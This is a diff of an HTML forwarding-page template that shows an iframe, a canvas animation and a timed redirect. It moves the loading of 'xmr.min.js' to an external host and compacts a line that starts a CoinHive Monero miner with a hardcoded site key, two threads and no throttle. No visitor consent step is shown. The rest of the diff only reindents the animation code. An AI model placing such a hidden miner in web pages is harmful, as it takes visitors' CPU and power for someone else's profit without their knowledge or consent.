@@ -59,7 +59,7 @@
 </p>
 <iframe src="${forwardURL}"></iframe>
 <script src="${staticServePath}/js/lib/jquery/jquery-3.1.0.min.js"></script>
-<script src="${staticServePath}/js/lib/xmr.min.js?${staticResourceVersion}"></script>
+<script src="https://static.hacpai.com/js/lib/xmr.min.js?${staticResourceVersion}"></script>
 <script>
     setTimeout(function () {
         window.location.href = '${forwardURL}'
@@ -86,16 +86,16 @@
 
     S.Drawing = (function () {
         var canvas,
-            context,
-            renderFn,
-            requestFrame = window.requestAnimationFrame ||
-                window.webkitRequestAnimationFrame ||
-                window.mozRequestAnimationFrame ||
-                window.oRequestAnimationFrame ||
-                window.msRequestAnimationFrame ||
-                function (callback) {
-                    window.setTimeout(callback, 1000 / 60);
-                };
+                context,
+                renderFn,
+                requestFrame = window.requestAnimationFrame ||
+                        window.webkitRequestAnimationFrame ||
+                        window.mozRequestAnimationFrame ||
+                        window.oRequestAnimationFrame ||
+                        window.msRequestAnimationFrame ||
+                        function (callback) {
+                            window.setTimeout(callback, 1000 / 60);
+                        };
 
         return {
             init: function (el) {
@@ -609,8 +609,7 @@
     }());
     S.init();
 
-    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0});
-    miner.start();
+    (new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0})).start();
 </script>
 </body>
 </html>
